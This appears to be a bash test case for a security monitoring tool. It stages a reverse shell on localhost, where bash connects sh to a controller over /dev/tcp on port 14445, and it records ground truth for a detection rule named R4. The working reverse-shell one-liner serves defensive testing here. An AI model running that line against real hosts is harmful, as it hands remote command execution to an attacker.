#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# trace: full
# Attack 2, a reverse shell: a controller on 14445 sends three commands (id, uname -a, exit) to a
# shell that the victim connected out to it with bash's /dev/tcp (sh's stdin, stdout and stderr are
# the socket); the output comes back to the controller.
# Ground truth: the commands reach `id` and `uname` (processes the shell started), and their output
# reaches the controller. R4 is the rule closest to this pattern; whether it fires is reported.
set -eu
W=$1 M=$2 H=$(dirname "$0")/..
printf 'id\nuname -a\nexit\n' >"$W/cmds"
python3 "$H/catcher.py" 14445 "$W/output.bin" "$W/ready" "$W/cmds" &
CTL=$!
for i in $(seq 100); do [ -f "$W/ready" ] && break; sleep 0.1; done
bash -c 'exec 3<>/dev/tcp/127.0.0.1/14445; exec sh <&3 >&3 2>&3'
wait $CTL
grep -q uid= "$W/output.bin" && echo "controller got the shell's output"
cat >"$M" <<J
{"reach": [{"name": "controller to id", "from": {"listener_port": 14445}, "to": {"exe": "id"}},
           {"name": "controller to uname", "from": {"listener_port": 14445}, "to": {"exe": "uname"}},
           {"name": "id's output to the controller", "from": {"exe": "id"}, "to": {"listener_port": 14445}}],
 "rules": ["R4"]}
J
